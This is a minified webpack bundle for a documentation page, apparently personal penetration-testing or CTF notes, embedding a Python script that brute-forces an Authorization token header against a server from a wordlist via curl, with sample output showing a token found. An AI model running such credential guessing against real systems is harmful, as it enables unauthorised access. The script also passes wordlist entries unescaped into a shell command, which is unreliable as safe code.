(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{101:function(e,n,r){"use strict";r.d(n,"a",(function(){return l})),r.d(n,"b",(function(){return f}));var t=r(0),a=r.n(t);function o(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function i(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function s(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?i(Object(r),!0).forEach((function(n){o(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function c(e,n){if(null==e)return{};var r,t,a=function(e,n){if(null==e)return{};var r,t,a={},o=Object.keys(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||(a[r]=e[r]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var p=a.a.createContext({}),u=function(e){var n=a.a.useContext(p),r=n;return e&&(r="function"==typeof e?e(n):s(s({},n),e)),r},l=function(e){var n=u(e.components);return a.a.createElement(p.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.a.createElement(a.a.Fragment,{},n)}},m=a.a.forwardRef((function(e,n){var r=e.components,t=e.mdxType,o=e.originalType,i=e.parentName,p=c(e,["components","mdxType","originalType","parentName"]),l=u(r),m=t,f=l["".concat(i,".").concat(m)]||l[m]||d[m]||o;return r?a.a.createElement(f,s(s({ref:n},p),{},{components:r})):a.a.createElement(f,s({ref:n},p))}));function f(e,n){var r=arguments,t=n&&n.mdxType;if("string"==typeof e||t){var o=r.length,i=new Array(o);i[0]=m;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s.mdxType="string"==typeof e?e:t,i[1]=s;for(var p=2;p<o;p++)i[p]=r[p];return a.a.createElement.apply(null,i)}return a.a.createElement.apply(null,r)}m.displayName="MDXCreateElement"},86:function(e,n,r){"use strict";r.r(n),r.d(n,"frontMatter",(function(){return i})),r.d(n,"metadata",(function(){return s})),r.d(n,"rightToc",(function(){return c})),r.d(n,"default",(function(){return u}));var t=r(2),a=r(6),o=(r(0),r(101)),i={title:"Python Scripts",sidebar_label:"Python Scripts"},s={unversionedId:"hunting/scripts/python_scripts",id:"hunting/scripts/python_scripts",isDocsHomePage:!1,title:"Python Scripts",description:"Run shell programs by reading command line arguments",source:"@site/docs\\hunting\\scripts\\python_scripts.md",permalink:"/rosh/docs/hunting/scripts/python_scripts",sidebar_label:"Python Scripts",sidebar:"huntingSidebar",previous:{title:"Bash Scripts",permalink:"/rosh/docs/hunting/scripts/bash_scripts"},next:{title:"curl",permalink:"/rosh/docs/hunting/utilities/curl"}},c=[{value:"Run shell programs by reading command line arguments",id:"run-shell-programs-by-reading-command-line-arguments",children:[]}],p={rightToc:c};function u(e){var n=e.components,r=Object(a.a)(e,["components"]);return Object(o.b)("wrapper",Object(t.a)({},p,r,{components:n,mdxType:"MDXLayout"}),Object(o.b)("h2",{id:"run-shell-programs-by-reading-command-line-arguments"},"Run shell programs by reading command line arguments"),Object(o.b)("p",null,"This script reads different tokens from a file and pass them to curl command to find out the valid token for authorization"),Object(o.b)("pre",null,Object(o.b)("code",Object(t.a)({parentName:"pre"},{className:"language-python"}),'import subprocess\nimport argparse\n\ndef crack(filename, ip_addr) :\n\n  with open(filename) as f:\n    password_list = f.readlines()\n  \n  # to remove whitespace characters like `\\n` at the end of each line\n  password_list = [x.strip() for x in password_list]  \n\n  print(password_list)\n\n  for password in password_list :\n    comd = "curl -s -H \'Authorization: Token " + password + "\' " + ip_addr  \n    print("Trying..." + password)\n    output = subprocess.run(comd, capture_output=True, shell=True).stdout.decode(\'utf-8\')\n\n    if "Unauth".lower() in output.lower():\n      print("Unauth".lower()+"--\x3e" + output.lower())\n      continue\n    else :\n      print("Found : " + password)\n      break\n\nif __name__ == "__main__":\n  parser = argparse.ArgumentParser()\n  parser.add_argument("filename", help="Enter the filename containing passwords")\n  parser.add_argument("ip_addr", help="Enter the IP address of server including http://")\n\n  args = parser.parse_args()\n  crack(args.filename, args.ip_addr)\n')),Object(o.b)("p",null,"Output"),Object(o.b)("pre",null,Object(o.b)("code",Object(t.a)({parentName:"pre"},{className:"language-sh"}),"$ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3\nTrying...damian\nunauth--\x3eunauthorized access\nTrying...123123123\nFound : 123123123\n")))}u.isMDXComponent=!0}}]);